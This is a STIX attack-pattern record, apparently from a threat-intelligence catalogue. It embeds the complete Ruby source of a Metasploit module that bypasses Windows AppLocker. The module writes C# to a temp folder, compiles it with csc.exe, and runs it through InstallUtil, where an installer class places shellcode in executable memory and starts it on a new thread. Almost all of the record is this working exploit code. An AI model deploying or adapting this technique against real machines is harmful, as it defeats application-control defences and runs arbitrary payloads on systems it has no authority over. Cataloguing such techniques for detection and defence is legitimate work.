{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1c8cc279-94db-43e6-aa07-63ddf9ec24ff",
    "created": "2024-08-14T16:50:02.411833Z",
    "modified": "2024-08-14T16:50:02.411837Z",
    "name": "AppLocker Execution Prevention Bypass",
    "description": " This module will generate a .NET service executable on the target and utilize InstallUtil to run the payload bypassing the AppLocker protection.  Currently only the InstallUtil method is provided, but future methods can be added easily.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/applocker_bypass.rb",
            "external_id": "applocker_bypass.rb"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/subTee/fac6af078937dda81e57"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'AppLocker Execution Prevention Bypass',\n        'Description' => %q{\n          This module will generate a .NET service executable on the target and utilize\n          InstallUtil to run the payload bypassing the AppLocker protection.\n\n          Currently only the InstallUtil method is provided, but future methods can be\n          added easily.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Casey Smith', # Original AppLocker bypass research\n          'OJ Reeves' # MSF module\n        ],\n        'Platform' => [ 'win' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [ [ 'Windows', {} ] ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2015-08-03',\n        'References' => [\n          ['URL', 'https://gist.github.com/subTee/fac6af078937dda81e57']\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  # Run Method for when run command is issued\n  def exploit\n    if payload.arch.first == ARCH_X64 && sysinfo['Architecture'] !~ /64/\n      fail_with(Failure::NoTarget, 'The target platform is x86. 64-bit payloads are not supported.')\n    end\n\n    # sysinfo is only on meterpreter sessions\n    print_status(\"Running module against #{sysinfo['Computer']}\") if not sysinfo.nil?\n\n    execute_installutil\n  end\n\n  def execute_installutil\n    envs = get_envs('TEMP', 'windir')\n\n    dotnet_path = get_dotnet_path(envs['windir'])\n    print_status(\"Using .NET path #{dotnet_path}\")\n\n    cs_path = \"#{envs['TEMP']}\\\\#{Rex::Text.rand_text_alpha(8)}.cs\"\n    exe_path = \"#{envs['TEMP']}\\\\#{Rex::Text.rand_text_alpha(8)}.exe\"\n\n    installutil_path = \"#{dotnet_path}\\\\InstallUtil.exe\"\n\n    print_status(\"Writing payload to #{cs_path}\")\n    write_file(cs_path, generate_csharp_source)\n    register_files_for_cleanup(cs_path)\n\n    print_status(\"Compiling payload to #{exe_path}\")\n    csc_path = \"#{dotnet_path}\\\\csc.exe\"\n    csc_platform = payload.arch.first == ARCH_X86 ? ARCH_X86 : ARCH_X64\n    vprint_status(\"Executing: #{csc_path} /target:winexe /nologo /platform:#{csc_platform} /w:0 /out:#{exe_path} #{cs_path}\")\n    cmd_exec(csc_path, \"/target:winexe /nologo /platform:#{csc_platform} /w:0 /out:#{exe_path} #{cs_path}\")\n\n    print_status(\"Executing payload ...\")\n    vprint_status(\"Executing: #{installutil_path} /logfile= /LogToConsole=false /U #{exe_path}\")\n    client.sys.process.execute(installutil_path, \"/logfile= /LogToConsole=false /U #{exe_path}\", { 'Hidden' => true })\n    register_files_for_cleanup(exe_path)\n  end\n\n  def get_dotnet_path(windir)\n    base_path = \"#{windir}\\\\Microsoft.NET\\\\Framework#{payload.arch.first == ARCH_X86 ? '' : '64'}\"\n    paths = dir(base_path).select { |p| p[0] == 'v' }\n    dotnet_path = nil\n\n    paths.reverse.each do |p|\n      path = \"#{base_path}\\\\#{p}\"\n      if directory?(path) && file?(\"#{path}\\\\InstallUtil.exe\")\n        dotnet_path = path\n        break\n      end\n    end\n\n    unless dotnet_path\n      fail_with(Failure::NotVulnerable, '.NET is not present on the target.')\n    end\n\n    dotnet_path\n  end\n\n  def generate_csharp_source\n    sc = payload.encoded.each_byte.map { |b| \"0x#{b.to_s(16)}\" }.join(',')\n    cs = %Q^\nusing System;\n\nnamespace Pop\n{\n  public class Program { public static void Main() { } }\n\n  [System.ComponentModel.RunInstaller(true)]\n  public class Pop : System.Configuration.Install.Installer\n  {\n    private static Int32 MEM_COMMIT=0x1000;\n    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;\n    private static UInt32 INFINITE = 0xFFFFFFFF;\n\n    [System.Runtime.InteropServices.DllImport(\"kernel32\")]\n    private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);\n\n    [System.Runtime.InteropServices.DllImport(\"kernel32\")]\n    private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr id);\n\n    [System.Runtime.InteropServices.DllImport(\"kernel32\")]\n    private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);\n\n    public override void Uninstall(System.Collections.IDictionary s)\n    {\n      byte[] sc = new byte[] {#{sc}};\n      IntPtr m = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n      System.Runtime.InteropServices.Marshal.Copy(sc, 0, m, sc.Length);\n      IntPtr id = IntPtr.Zero;\n      WaitForSingleObject(CreateThread(id, UIntPtr.Zero, m, id, 0, ref id), INFINITE);\n    }\n  }\n}\n    ^\n\n    cs\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-08-03",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}